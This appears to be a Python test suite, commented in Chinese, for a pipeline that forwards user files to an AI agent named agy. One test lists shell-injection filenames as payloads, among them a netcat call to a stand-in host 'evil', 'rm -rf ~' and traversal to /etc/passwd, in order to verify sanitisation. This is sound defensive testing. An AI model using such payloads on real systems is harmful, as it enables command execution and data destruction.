#!/usr/bin/env python3
"""
文件任务转发测试 (tests/test_file_pipeline.py)

流水线已经改成"原样转发给 agy，agy 自己动手"。因此这里只测
**agy 够不着的确定性部分**（GEMINI.md《测什么，不测什么》）：

  - 文件名收敛（路径会进 agy 执行的 shell）
  - prompt 的结构（路径、输出目录、无指令时的只读约束）
  - 产物回收与打包
  - agy 各种收场方式下的处置（超时、失败、把产物写错目录）

**不测** agy 会怎么规划、会选什么参数、会怎么措辞 —— 那正是交给它的东西。
效果好不好靠 workspace/archive/ 里的实际产物验证。
"""

import os
import shutil
import subprocess
import sys
import tempfile
import types

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core import file_pipeline as fp
from tests.harness import main


def _has(binary):
    return shutil.which(binary) is not None


def _make_image(path, size="300x200", gradient="blue-red"):
    tool = "magick" if _has("magick") else "convert"
    subprocess.run(
        [tool, "-size", size, f"gradient:{gradient}", path],
        capture_output=True, timeout=30,
    )
    return os.path.exists(path)


def _fake_agy(work, script):
    """造一个假的 agy 可执行文件，让 run_task 能被端到端驱动。

    比打桩 subprocess 更接近真实：参数拼装、超时、返回码、cwd 都真的走一遍。
    """
    path = os.path.join(work, "fake_agy")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("#!/bin/bash\n" + script)
    os.chmod(path, 0o755)
    return path


def test_filename_injection(s):
    """文件名会进入 agy 执行的 shell 命令，必须先中和元字符。

    真实攻击面：用户转发一个来自频道的恶意命名文件即可触发任意命令执行。
    执行方从 Python 换成 agy **不会**让这个风险消失 —— agy 同样是把路径
    拼进 bash 跑，而且它带 --dangerously-skip-permissions。
    """
    s.section("shell 元字符必须被中和")
    payloads = [
        "report;touch PWNED;.pdf",
        "a$(id).jpg",
        "`whoami`.png",
        "x|nc evil 1234.mp4",
        "a && rm -rf ~.txt",
        "n\newline.jpg",
        "quote'\"quote.png",
        "glob*?[].jpg",
        "$HOME.txt",
        "tab\there.pdf",
    ]
    dangerous = set(";|&$`()<>*?[]{}!\\'\" \n\t\r")
    for raw in payloads:
        got = fp.safe_filename(raw)
        leaked = sorted(set(got) & dangerous)
        s.check(f"{raw!r} 无残留元字符", leaked, [])

    s.section("路径穿越")
    s.check("../../etc/passwd", fp.safe_filename("../../etc/passwd"), "passwd")
    s.check("绝对路径", fp.safe_filename("/etc/shadow"), "shadow")

    s.section("可用性：正常文件名不被破坏")
    s.check("中文保留", fp.safe_filename("季度报告.pdf"), "季度报告.pdf")
    s.check("常规英文", fp.safe_filename("report_v2-final.docx"), "report_v2-final.docx")
    s.truthy("空名有兜底", fp.safe_filename("") == "file")
    s.truthy("纯符号有兜底", fp.safe_filename("***") == "file")
    s.truthy("扩展名保留", fp.safe_filename("x;y.mp4").endswith(".mp4"))

    s.section("端到端：收敛后的名字进 shell 不再触发")
    work = tempfile.mkdtemp()
    try:
        safe = fp.safe_filename("report;touch PWNED_MARKER;.jpg")
        path = os.path.join(work, safe)
        with open(path, "w") as fh:
            fh.write("x")
        subprocess.run(f"cat {path} >/dev/null", shell=True,
                       cwd=work, capture_output=True, timeout=30)
        s.check("未产生注入痕迹",
                os.path.exists(os.path.join(work, "PWNED_MARKER")), False)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_task_prompt_structure(s):
    """prompt 只保证**结构**：路径、输出目录、无指令时的只读约束。

    不断言任何措辞 —— 这段话要能随时改得更好，断言散文只会把它锁死。
    """
    s.section("必备结构")
    p = fp.build_task_prompt(["/abs/in/a.mov", "/abs/in/b.png"], "/abs/out", "转gif")
    s.truthy("含全部输入路径", "/abs/in/a.mov" in p and "/abs/in/b.png" in p)
    s.truthy("含输出目录", "/abs/out" in p)
    s.truthy("原样带上用户那句话", "转gif" in p)
    s.truthy("带内部会话标记", fp.INTERNAL_MARKER in p)
    s.truthy("内联了工具清单", "ffmpeg" in p)

    s.section("有指令时不加只读约束")
    s.check("无只读段", fp.READ_ONLY_NOTICE in p, False)

    s.section("无指令时必须加只读约束")
    # 没有任何指令却动手改文件，是"我没让你干你却干了"，比不干更糟
    for empty in ("", "   ", None):
        q = fp.build_task_prompt(["/abs/in/a.mov"], "/abs/out", empty)
        s.truthy(f"{empty!r} → 含只读段", fp.READ_ONLY_NOTICE in q)


def test_output_collection(s):
    """产物回收，含"agy 把文件写到了输入目录"的兜底。"""
    work = tempfile.mkdtemp()
    try:
        win, wout = os.path.join(work, "in"), os.path.join(work, "out")
        os.makedirs(win)
        os.makedirs(wout)
        with open(os.path.join(win, "src.mov"), "w") as fh:
            fh.write("x")
        originals = ("src.mov",)

        s.section("正常情况：产物在输出目录")
        with open(os.path.join(wout, "out.gif"), "w") as fh:
            fh.write("y")
        got = fp.collect_outputs(win, wout, originals)
        s.check("回收到 1 个", [os.path.basename(p) for p in got], ["out.gif"])

        s.section("兜底：产物落在输入目录")
        os.remove(os.path.join(wout, "out.gif"))
        with open(os.path.join(win, "stray.gif"), "w") as fh:
            fh.write("z")
        got = fp.collect_outputs(win, wout, originals)
        s.check("被搬进输出目录", [os.path.basename(p) for p in got], ["stray.gif"])
        s.check("确实搬走了", os.path.exists(os.path.join(win, "stray.gif")), False)
        s.check("原始输入没被当成产物",
                os.path.exists(os.path.join(win, "src.mov")), True)

        s.section("什么都没产出")
        os.remove(os.path.join(wout, "stray.gif"))
        s.check("返回空", fp.collect_outputs(win, wout, originals), [])
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_run_task_outcomes(s):
    """agy 的几种收场方式都要有确定的处置。"""
    work = tempfile.mkdtemp()
    original_bin, original_timeout = fp.AGY_BIN, fp.TASK_TIMEOUT
    try:
        win, wout = os.path.join(work, "in"), os.path.join(work, "out")
        os.makedirs(win)
        os.makedirs(wout)
        src = os.path.join(win, "src.mov")
        with open(src, "w") as fh:
            fh.write("x")

        s.section("正常：有产物 + 有文字回复")
        fp.AGY_BIN = _fake_agy(work, f'echo "我把它转成了 GIF"\ntouch {wout}/out.gif\n')
        ok, products, reply, err = fp.run_task([src], win, wout, "转gif", "m")
        s.check("成功", ok, True)
        s.check("拿到产物", [os.path.basename(p) for p in products], ["out.gif"])
        s.truthy("拿到回复", "转成了 GIF" in reply)
        s.check("无错误", err, None)
        os.remove(os.path.join(wout, "out.gif"))

        s.section("只回答不动手（用户只是问了个问题）")
        fp.AGY_BIN = _fake_agy(work, 'echo "这是一段屏幕录制"\n')
        ok, products, reply, err = fp.run_task([src], win, wout, "这是什么", "m")
        s.check("仍算成功", ok, True)
        s.check("没有产物", products, [])
        s.truthy("有回复", "屏幕录制" in reply)

        s.section("agy 失败且什么都没产出")
        fp.AGY_BIN = _fake_agy(work, 'echo "工具不支持这个格式"\nexit 1\n')
        ok, products, reply, err = fp.run_task([src], win, wout, "转gif", "m")
        s.check("判为失败", ok, False)
        s.truthy("错误里带上了 agy 的说明", "工具不支持" in (err or ""))

        s.section("退出码非 0 但产物已生成 → 仍算成功")
        # agy 常在收尾做点无关紧要的事失败，产物已经躺在那儿就不该判失败
        fp.AGY_BIN = _fake_agy(work, f'touch {wout}/done.gif\nexit 1\n')
        ok, products, _reply, _err = fp.run_task([src], win, wout, "转gif", "m")
        s.check("算成功", ok, True)
        s.check("产物在", [os.path.basename(p) for p in products], ["done.gif"])
        os.remove(os.path.join(wout, "done.gif"))

        s.section("超时")
        fp.TASK_TIMEOUT = 1
        fp.AGY_BIN = _fake_agy(work, "sleep 5\n")
        ok, products, _reply, err = fp.run_task([src], win, wout, "转gif", "m")
        s.check("判为失败", ok, False)
        s.truthy("说明是超时", "超过" in (err or ""))

        s.section("凭证失效要给出可操作的提示")
        fp.TASK_TIMEOUT = original_timeout
        fp.AGY_BIN = _fake_agy(work, 'echo "Error: unauthorized" >&2\nexit 1\n')
        ok, _p, _r, err = fp.run_task([src], win, wout, "转gif", "m")
        s.check("判为失败", ok, False)
        s.check("给的是登录提示", err, fp.AUTH_HINT)

        s.section("留痕拿得到本次的关键信息")
        fp.AGY_BIN = _fake_agy(work, f'echo "ok"\ntouch {wout}/x.gif\n')
        trace = {}
        fp.run_task([src], win, wout, "转gif", "m", trace=trace)
        s.check("记下用户原话", trace.get("message"), "转gif")
        s.check("记下产物", trace.get("product_names"), ["x.gif"])
        s.truthy("记下 agy 的回复", "ok" in trace.get("reply", ""))
    finally:
        fp.AGY_BIN, fp.TASK_TIMEOUT = original_bin, original_timeout
        shutil.rmtree(work, ignore_errors=True)


def test_inline_text_products(s):
    """转写稿这类文本产物应直接作为消息发出，而不是让用户下载附件。"""
    s.section("扩展名与阈值")
    s.truthy(".txt 属于文本类", ".txt" in fp.TEXT_EXTS)
    s.truthy(".srt 属于文本类", ".srt" in fp.TEXT_EXTS)
    s.truthy("有长度上限", fp.INLINE_TEXT_MAX_CHARS > 0)

    from core.handlers import agy_handler as ah
    work = tempfile.mkdtemp()
    try:
        sent = []

        class _Bot:
            def send_chat_action(self, *a, **k):
                pass

            def send_message(self, cid, text, **k):
                sent.append(("message", text))
                return types.SimpleNamespace(message_id=1)

            def send_document(self, cid, fh, **k):
                sent.append(("document", os.path.basename(fh.name)))

        short = os.path.join(work, "t.txt")
        with open(short, "w", encoding="utf-8") as fh:
            fh.write("今天的会议讨论了三个议题")
        ah._send_product(_Bot(), 1, 1, short)
        s.check("短文本作为消息发出", sent[-1][0], "message")
        s.truthy("消息含正文", "三个议题" in sent[-1][1])

        long_path = os.path.join(work, "big.txt")
        with open(long_path, "w", encoding="utf-8") as fh:
            fh.write("x" * (fp.INLINE_TEXT_MAX_CHARS + 100))
        ah._send_product(_Bot(), 1, 1, long_path)
        s.check("超长仍作为附件", sent[-1][0], "document")
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_gif_product_delivery(s):
    """GIF 必须以「关闭内容嗅探的文件」回传。

    Telegram 认出 GIF 就会在服务端转成 MP4 并压掉尺寸（实测 720x405/723KB
    → 320x180/21KB），send_animation 与普通 send_document 都挡不住，
    只有 disable_content_type_detection=True 能保住原文件。
    """
    from core.handlers import agy_handler as ah
    work = tempfile.mkdtemp()
    try:
        calls = []

        class _Bot:
            def send_chat_action(self, *a, **k):
                pass

            def send_animation(self, cid, fh, **k):
                calls.append(("animation", k))

            def send_video(self, cid, fh, **k):
                calls.append(("video", k))

            def send_document(self, cid, fh, **k):
                calls.append(("document", k))

        gif = os.path.join(work, "demo.gif")
        with open(gif, "wb") as fh:
            fh.write(b"GIF89a" + b"\0" * 32)
        ah._send_product(_Bot(), 1, 1, gif)

        s.section("投递方式")
        s.check("只发了一次", len(calls), 1)
        method, kwargs = calls[0]
        s.check("走 send_document 而非 send_animation", method, "document")
        s.check("关闭了服务端内容嗅探",
                kwargs.get("disable_content_type_detection"), True)
        # 不带 caption：GIF 转换是高频功能，每次附一段 Telegram 内部行为说明就是刷屏
        s.check("不附带说明文案", kwargs.get("caption"), None)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_product_packaging(s):
    """产物过多时打包，避免刷屏与频率限制。"""
    work = tempfile.mkdtemp()
    try:
        s.section(f"不超过 {fp.MAX_INLINE_PRODUCTS} 个则原样投递")
        few = []
        for i in range(fp.MAX_INLINE_PRODUCTS):
            p = os.path.join(work, f"p{i}.png")
            with open(p, "w") as fh:
                fh.write("x")
            few.append(p)
        got, packed = fp.package_products(few, work, "src")
        s.check("未打包", packed, False)
        s.check("数量不变", len(got), fp.MAX_INLINE_PRODUCTS)

        s.section("超过则打成单个 zip")
        extra = os.path.join(work, "extra.png")
        with open(extra, "w") as fh:
            fh.write("x")
        got, packed = fp.package_products(few + [extra], work, "src")
        s.check("已打包", packed, True)
        s.check("只剩一个投递目标", len(got), 1)
        s.truthy("是 zip", got[0].endswith(".zip"))
        s.check("原始产物已清理", os.path.exists(extra), False)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_toolchain_is_inlined(s):
    """工具清单是唯一还会进 prompt 的项目文档，必须真的读得到。"""
    s.section("能载入且含核心工具")
    tc = fp.load_toolchain()
    s.truthy("非空", len(tc) > 100)
    for cmd in ("ffmpeg", "ffprobe", "pandoc", "pngquant", "pdftotext"):
        s.truthy(f"声明了 {cmd}", cmd in tc)


def test_probe_reports_facts(s):
    """探针只用于日志与留痕，但不能因此就允许它抛异常。"""
    work = tempfile.mkdtemp()
    try:
        s.section("坏文件不抛异常")
        bad = os.path.join(work, "bad.mp4")
        with open(bad, "wb") as fh:
            fh.write(b"not a video")
        s.truthy("仍返回一行描述", isinstance(fp.probe_file(bad), str))
        s.truthy("含文件名", "bad.mp4" in fp.probe_file(bad))

        s.section("不存在的路径")
        s.truthy("有兜底文案", "无法读取" in fp.probe_file(os.path.join(work, "nope.x")))

        if _has("ffmpeg"):
            s.section("视频能探到分辨率与时长")
            clip = os.path.join(work, "c.mp4")
            subprocess.run(
                ["ffmpeg", "-v", "error", "-f", "lavfi",
                 "-i", "testsrc2=size=320x240:rate=15:duration=2",
                 "-pix_fmt", "yuv420p", "-y", clip],
                capture_output=True, timeout=120,
            )
            meta = fp.probe_file(clip)
            s.truthy("含分辨率", "320x240" in meta)
            s.truthy("含时长", "s" in meta)
    finally:
        shutil.rmtree(work, ignore_errors=True)


SUITES = [
    ("文件名注入防护", test_filename_injection),
    ("任务 prompt 结构", test_task_prompt_structure),
    ("产物回收", test_output_collection),
    ("agy 收场处置", test_run_task_outcomes),
    ("文本产物内联", test_inline_text_products),
    ("GIF 产物投递", test_gif_product_delivery),
    ("产物打包", test_product_packaging),
    ("工具清单内联", test_toolchain_is_inlined),
    ("元数据探针", test_probe_reports_facts),
]

if __name__ == "__main__":
    main(SUITES)
